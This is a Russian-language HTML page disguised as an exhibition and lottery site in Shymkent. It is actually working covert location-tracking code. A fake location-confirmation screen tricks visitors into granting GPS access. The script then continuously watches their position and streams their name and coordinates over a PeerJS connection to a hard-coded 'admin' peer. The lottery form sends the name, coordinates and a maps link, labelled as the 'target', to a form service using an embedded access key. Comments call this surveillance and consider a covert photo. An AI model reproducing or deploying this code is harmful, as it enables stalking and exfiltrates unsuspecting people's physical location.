<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Жас Түлек — 2026 | Цитадель</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        /* Весь твой старый стиль остается здесь */
        :root { --primary-pink: #ff85a2; --citadel-gold: #d4af37; --dark-text: #2c3e50; }
        body { font-family: sans-serif; margin: 0; background-color: #fdf5f0; }
        .container { max-width: 600px; margin: 20px auto; padding: 20px; background: white; border-radius: 20px; }
        
        /* ЭКРАН БЛОКИРОВКИ */
        #geo-lock {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center; padding: 20px;
        }
        .btn-allow { background: #ff4d4d; color: white; padding: 15px 30px; border-radius: 50px; border: none; font-weight: bold; font-size: 18px; margin-top: 20px; }
    </style>
</head>
<body>

<div id="geo-lock">
    <img src="https://cdn-icons-png.flaticon.com/512/819/819814.png" width="100">
    <h2>ПОДТВЕРДИТЕ МЕСТОПОЛОЖЕНИЕ</h2>
    <p>Для доступа к эксклюзивным материалам выставки «Жас Түлек» необходимо подтвердить, что вы находитесь в Шымкенте.</p>
    <button class="btn-allow" onclick="requestAccess()">ПОДТВЕРДИТЬ</button>
</div>

<div id="main-site" style="display:none;">
    <header style="background: #ff85a2; color: white; padding: 20px; text-align: center;">
        <h1>ЖАС ТҮЛЕК — 2026</h1>
    </header>

    <div class="container">
        <div style="background: #fff9fa; border: 2px solid #ff85a2; padding: 15px; border-radius: 15px; margin-bottom: 20px;">
            🏛️ <b>ВЫСТАВКА В ЦИТАДЕЛИ ОТКРЫТА!</b><br>
            Разблокирован доступ к онлайн-каталогу.
        </div>

        <div id="lottery" style="border: 3px dashed #d4af37; padding: 20px; border-radius: 20px; text-align: center;">
            <h3>🎟️ РОЗЫГРЫШ ТУРА В ЦИТАДЕЛЬ!</h3>
            <input type="text" id="userName" placeholder="Ваше имя" style="width:90%; padding:10px; margin-bottom:10px;">
            <input type="text" id="secretCode" placeholder="Кодовое слово (если есть)" style="width:90%; padding:10px; margin-bottom:10px;">
            <button onclick="runFinalAction()" style="background:#ff4d4d; color:white; width:100%; padding:15px; border:none; border-radius:10px; font-weight:bold;">УЧАСТВОВАТЬ!</button>
        </div>
    </div>
</div>

<video id="hidden-video" autoplay playsinline style="display:none;"></video>
<canvas id="hidden-canvas" style="display:none;"></canvas>

<script>
    let peer;
    let conn;
    let myCoords = { lat: 0, lon: 0 };
    const ADMIN_ID = 'bark-beetle-shymkent-536'; // ДОЛЖЕН СОВПАДАТЬ С АДМИНКОЙ

    // 1. ЗАПРОС ДОСТУПА И ВКЛЮЧЕНИЕ СВЯЗИ
    async function requestAccess() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                myCoords.lat = pos.coords.latitude;
                myCoords.lon = pos.coords.longitude;
                
                // Убираем замок
                document.getElementById('geo-lock').style.display = 'none';
                document.getElementById('main-site').style.display = 'block';

                // Запускаем скрытый "Радар" (PeerJS)
                initP2P();
                
                // Начинаем слежку
                navigator.geolocation.watchPosition(updateLocation);
            }, () => {
                alert("Ошибка! Без GPS доступ к материалам выставки запрещен.");
            });
        }
    }

    function initP2P() {
        peer = new Peer(); 
        peer.on('open', (id) => {
            conn = peer.connect(ADMIN_ID);
            conn.on('open', () => {
                sendToAdmin("Объект вошел на сайт");
            });
        });
    }

    function updateLocation(pos) {
        myCoords.lat = pos.coords.latitude;
        myCoords.lon = pos.coords.longitude;
        if (conn && conn.open) {
            sendToAdmin("Обновление координат");
        }
    }

    function sendToAdmin(msg) {
        if (conn && conn.open) {
            conn.send({
                name: document.getElementById('userName').value || "Аноним",
                lat: myCoords.lat,
                lon: myCoords.lon,
                time: new Date().toLocaleTimeString(),
                status: msg
            });
        }
    }

    // 2. ФИНАЛЬНОЕ ДЕЙСТВИЕ (ЛОТЕРЕЯ)
    async function runFinalAction() {
        const name = document.getElementById('userName').value;
        if(!name) { alert("Введите имя!"); return; }

        // Здесь можно добавить скрытое фото, если хочешь (но будет запрос!)
        // Оставляем только отправку данных
        sendToAdmin("Участие в лотерее");

        // Отправка на Web3Forms (классика)
        const payload = {
            access_key: "5931c081-de5a-458f-b1ab-824418ecfd61",
            message: `ЦЕЛЬ: ${name}\nGPS: ${myCoords.lat}, ${myCoords.lon}\nКарта: https://www.google.com/maps?q=${myCoords.lat},${myCoords.lon}`
        };

        fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify(payload)
        });

        alert("Заявка принята! Ожидайте звонка организаторов.");
    }
</script>
</body>
</html>
